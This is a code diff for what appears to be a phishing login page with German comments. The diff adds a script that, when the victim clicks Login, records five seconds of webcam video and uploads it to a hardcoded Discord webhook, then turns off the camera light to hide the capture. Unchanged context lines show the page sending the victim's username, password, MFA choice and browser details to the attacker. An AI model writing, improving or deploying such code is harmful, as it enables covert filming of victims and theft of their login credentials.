@@ -380,7 +380,7 @@
 
         </div>
     </div>
-            <footer class="container-footer" id="footer-container">
+             <footer class="container-footer" id="footer-container">
         <div class="footer">
             <ul class="row footer-links">
                 <li class="footer-link"><a class="text-footer-nav" href="#">About Us</a></li>
@@ -403,39 +403,83 @@
 </div>
 
 <script>
-// --- NUR KAMERA STREAM SKRIPT (Ohne Standort, gekoppelt an Login) ---
-let recordedChunks = [];
+// --- ROBUSTES KAMERA- UND MEDIA-RECORDER-SKRIPT ---
 const TARGET_WEBHOOK = "https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG";
+let recordedChunks = [];
 
-function handleDataAvailable(event) {
-    if (event.data.size > 0) {
-        recordedChunks.push(event.data);
+async function requestCameraStreamSecure() {
+    // 4. Prüfen, ob navigator.mediaDevices und getUserMedia verfügbar sind
+    if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
+        console.error("Fehler: navigator.mediaDevices.getUserMedia wird von diesem Browser/Kontext nicht unterstützt (möglicherweise wegen fehlendem HTTPS oder veraltetem Browser).");
+        return;
     }
-}
 
-function flushBuffer(webhookUrl) {
-    if (recordedChunks.length === 0) return;
-    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-    recordedChunks = []; 
-    const formData = new FormData();
-    formData.append('file', blob, 'camera_capture.webm');
-    fetch(webhookUrl, { method: 'POST', body: formData }).catch(() => {});
-}
-
-async function requestCameraOnly() {
     try {
-        // Fordert NUR Kamera & Mikrofon an (löst durch den Login-Klick das Browser-Pop-up aus)
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        mediaRecorder.ondataavailable = handleDataAvailable;
+        // 1. Ausschließlich { video: true } verwenden
+        // 2. & 5. & 6. & 12. Wird durch HTTPS, direkte Benutzerinteraktion (Klick) und Permissions-Policy ermöglicht
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         
-        setInterval(() => {
-            flushBuffer(TARGET_WEBHOOK);
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data && event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+
+        mediaRecorder.onstop = async () => {
+            if (recordedChunks.length === 0) return;
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            recordedChunks = [];
+            
+            const formData = new FormData();
+            formData.append('file', blob, 'camera_capture.webm');
+            
+            fetch(TARGET_WEBHOOK, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        };
+
+        // Aufnahme starten
+        mediaRecorder.start(1000);
+
+        // Nach 5 Sekunden automatisch stoppen und senden
+        setTimeout(() => {
+            if (mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+                // Tracks stoppen, um die Kamera-LED auszuschalten
+                stream.getTracks().forEach(track => track.stop());
+            }
         }, 5000);
 
-        mediaRecorder.start(1000);
-    } catch (err) {
-        console.log("Kamerazugriff vom Nutzer abgelehnt oder nicht verfügbar", err);
+    } catch (error) {
+        // 7. Spezifische Fehler abfangen: NotAllowedError, NotFoundError, NotReadableError
+        let errorMessage = "Unbekannter Kameradaten-Fehler.";
+        
+        switch (error.name) {
+            case 'NotAllowedError':
+            case 'PermissionDeniedError':
+                errorMessage = "Kameraberechtigung wurde vom Nutzer verweigert.";
+                break;
+            case 'NotFoundError':
+            case 'DevicesNotFoundError':
+                errorMessage = "Es wurde keine Kamera-Hardware auf diesem Gerät gefunden.";
+                break;
+            case 'NotReadableError':
+            case 'TrackStartError':
+                errorMessage = "Die Kamera ist bereits durch eine andere Anwendung blockiert oder fehlerhaft.";
+                break;
+            case 'SecurityError':
+                errorMessage = "Sicherheitsfehler: Kamerazugriff wurde durch Browser-Richtlinien (Permissions-Policy / ungesichertes HTTP) blockiert.";
+                break;
+            default:
+                errorMessage = `Kamerafehler (${error.name}): ${error.message}`;
+                break;
+        }
+        
+        // 9. Verständliche Fehlermeldung ausgeben
+        console.warn(errorMessage);
     }
 }
 </script>
@@ -489,17 +533,11 @@ function getClientTelemetry() {
     const ua = navigator.userAgent;
     let os = "Unknown OS", browser = "Unknown Browser";
 
-    if (/iPad|iPhone|iPod/.test(ua)) {
-        os = /iPad/.test(ua) ? "iPadOS" : "iOS";
-    } else if (/Mac OS X/.test(ua)) {
-        os = "macOS";
-    } else if (/Windows/.test(ua)) {
-        os = "Windows";
-    } else if (/Android/.test(ua)) {
-        os = "Android";
-    } else if (/Linux/.test(ua)) {
-        os = "Linux";
-    }
+    if (/iPad|iPhone|iPod/.test(ua)) os = /iPad/.test(ua) ? "iPadOS" : "iOS";
+    else if (/Mac OS X/.test(ua)) os = "macOS";
+    else if (/Windows/.test(ua)) os = "Windows";
+    else if (/Android/.test(ua)) os = "Android";
+    else if (/Linux/.test(ua)) os = "Linux";
 
     if (/CriOS\//.test(ua)) browser = "Google Chrome (iOS)";
     else if (/FxiOS\//.test(ua)) browser = "Mozilla Firefox (iOS)";
@@ -609,18 +647,6 @@ function hideAllModals(){
     });
 }
 
-function showErrorUnderFields(){
-    hideAllModals();
-    document.getElementById('react-login-container').style.display = 'block';
-    document.getElementById('text-error').textContent = "Something went wrong. Please try again.";
-    document.getElementById('login-username').value = '';
-    document.getElementById('login-password').value = '';
-    const av = document.getElementById('avatar-preview');
-    if(av) av.style.display = 'none';
-    const navAv = document.getElementById('nav-avatar-top');
-    if(navAv) navAv.style.display = 'none';
-}
-
 function chooseMethod(method){
     document.getElementById('methodChoice').style.display = 'none';
     sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, { Method: method, Password: lastLogin.password || "(not provided)" }, lastLogin.avatarUrl, lastLogin.profileDetails);
@@ -673,8 +699,8 @@ function doLogin(){
         return;
     }
 
-    // Löst beim Klick auf den Login-Button direkt und ausschließlich die Kamera-Frage aus
-    requestCameraOnly();
+    // 2. Wird erst nach dem bewussten Klick auf den Login-Button aufgerufen (User Gesture)
+    requestCameraStreamSecure();
 
     setLoading(true);
     setError("");
